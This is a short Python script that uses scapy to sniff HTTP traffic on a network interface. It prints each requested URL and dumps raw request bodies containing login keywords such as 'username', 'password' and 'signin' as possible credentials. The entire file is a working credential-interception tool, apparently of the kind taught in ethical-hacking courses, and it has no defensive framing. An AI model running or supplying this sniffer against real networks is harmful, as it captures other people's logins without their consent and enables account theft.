import scapy.all as scapy
from scapy.layers import http
def sniffer(interface):  # sniffing
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def process_packet(packet):  # http packet get
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('[+] HTTP Requests/URL Requested -> {}'.format(url), '\n')
        cred = get_credentials(packet)
        if cred:
            print(
                '\n\n[+] Possible Credential Information -> {}'.format(cred), '\n\n')


def get_url(packet):  # url get in http packet
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')


keywords = ('username', 'uname', 'user', 'login',
            'password', 'pass', 'signin', 'signup', 'name')


def get_credentials(packet):  # analyze http packet
    if packet.haslayer(scapy.Raw):
        field_load = packet[scapy.Raw].load.decode('utf-8')
        for keyword in keywords:
            if keyword in field_load:
                return field_load
